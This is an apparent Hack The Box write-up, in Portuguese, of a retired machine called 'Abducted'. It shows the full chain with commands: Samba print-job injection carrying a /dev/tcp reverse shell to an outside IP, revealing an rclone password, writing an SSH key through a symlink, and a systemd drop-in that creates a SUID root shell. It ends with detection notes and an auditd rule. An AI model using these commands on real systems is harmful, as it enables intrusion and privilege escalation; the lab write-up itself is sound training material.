---
title: 'Abducted'
summary: 'Uma impressora Samba acessível a guest vira RCE por injeção no nome do job de impressão (CVE-2026-4480); uma senha ofuscada do rclone leva ao primeiro usuário, um symlink por wide links força escrita na home de outro, e um drop-in de systemd via polkit fecha em root.'
lang: pt-BR
type: writeup
platform: htb
htbKind: machine
difficulty: medium
os: linux
retiredOn: 2026-08-30
publishedOn: 2026-11-22
attack: [T1190, T1552.001, T1078, T1547.013, T1548]
timeline:
  - title: Recon
    detail: 'nmap mostra 22 (SSH) e 139/445 (Samba). rpcclient anônimo enumera o usuário scott; shares HP-Reception (printer), projects e transfer.'
  - title: 'Foothold — injeção na impressora Samba (CVE-2026-4480)'
    detail: 'O print command recebe o nome do job (%J) sem escapar metacaracteres. Um arquivo chamado |bash cujo conteúdo é o reverse shell executa como nobody.'
    attack: [T1190]
  - title: 'nobody → scott (rclone reveal)'
    detail: 'Senha ofuscada em /opt/offsite-backup/rclone.conf; rclone reveal devolve a senha em claro, reusada no SSH.'
    attack: [T1552.001, T1078]
  - title: 'scott → marcus (wide links + force user)'
    detail: 'O share transfer tem force user = marcus e wide links. scott é dono do path, planta um symlink para /home/marcus e escreve uma authorized_keys.'
    attack: [T1547.013]
  - title: 'marcus → root (systemd drop-in via polkit)'
    detail: 'marcus está em operators, que pode escrever no drop-in dir do smbd e reiniciar o serviço via polkit. Um ExecStartPre roda como root no restart.'
    attack: [T1548]
detection:
  level: 1
  telemetry:
    - 'Logs do Samba (smbd, log level >= 2): conexão guest ao share de impressora e print command executado'
    - 'auditd: execve de /bin/bash filho do smbd, ou processo filho do smbd que não seja o print command esperado'
    - 'auditd/FIM: escrita em /etc/systemd/system/*.service.d/ e systemctl daemon-reload/restart fora de janela de manutenção'
  logic: |
    title: smbd gera shell (injeção no print command)
    logsource: { product: linux, service: auditd }
    detection:
      selection:
        syscall: execve
        ppid_comm: 'smbd'
        exe|endswith: ['/bash', '/sh', '/dash']
      condition: selection
  notes: 'Nível 1: não rodado contra log real. O caminho confiável é o auditd no host; o log do Samba sozinho raramente mostra o comando executado.'
---

> Máquina aposentada do Hack The Box. Sem flags.

## Recon

`nmap`: **22 (SSH)** e **139/445 (Samba)**. NetBIOS `ABDUCTED`. `rpcclient` anônimo enumerou um usuário, **`scott`**. Shares: `HP-Reception` (printer), `projects`, `transfer`.

## Foothold — injeção na impressora Samba (CVE-2026-4480)

O share `HP-Reception` era uma **impressora acessível a guest**. O Samba passa o nome do job de impressão (`%J`) para o `print command` **sem escapar metacaracteres de shell**.

Cria-se um arquivo local chamado literalmente `|bash`, cujo **conteúdo** é o reverse shell:

```bash
echo 'bash -i >& /dev/tcp/10.10.17.63/443 0>&1' > '|bash'
smbclient //target/HP-Reception -N -c 'print "|bash"'
```

No servidor, `print command` vira `printaudit |bash <spoolfile>` → o shell lê como `printaudit | bash <spoolfile>` e executa o conteúdo do arquivo. Shell como `nobody`.

> Detalhe honesto: a primeira tentativa, com backticks + `${IFS}`, **não funcionou**. O vetor era o `|` com o conteúdo do arquivo, não injeção no nome.

## nobody → scott

Senha ofuscada do rclone em `/opt/offsite-backup/rclone.conf`:

```bash
rclone reveal HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
```

Reuso de credencial → `ssh scott@target`.

## scott → marcus (wide links + force user)

```ini
[transfer]
   path = /srv/transfer
   valid users = scott
   force user = marcus
   wide links = yes
```

Como `scott` é dono de `/srv/transfer`, ele planta um symlink para `/home/marcus`. Acessando via SMB (que força `marcus` e segue wide links), escreve na home do marcus:

```bash
ssh scott@target 'ln -s /home/marcus /srv/transfer/m'
smbclient //target/transfer -U 'scott%<senha>' -c \
  'cd m; mkdir .ssh; cd .ssh; put id_ed25519.pub authorized_keys'
```

SSH como **marcus**, que estava no grupo `operators`.

## marcus → root (systemd drop-in via polkit)

`marcus ∈ operators`, e `/etc/systemd/system/smbd.service.d/` era gravável pelo grupo, que também podia reiniciar o `smbd` via polkit:

```ini
[Service]
ExecStartPre=/bin/bash -c 'cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash'
```

`systemctl daemon-reload && systemctl restart smbd` → SUID bash como root.

## Do lado do blue team

Toda a cadeia passa por serviços legítimos (Samba, systemd). O ponto de inflexão observável é o `smbd` **gerando um shell** — um filho `/bin/bash` do `smbd` não faz parte do fluxo normal de impressão. No root, o sinal é escrita no diretório de drop-in do serviço seguida de `daemon-reload`/`restart` fora de manutenção.
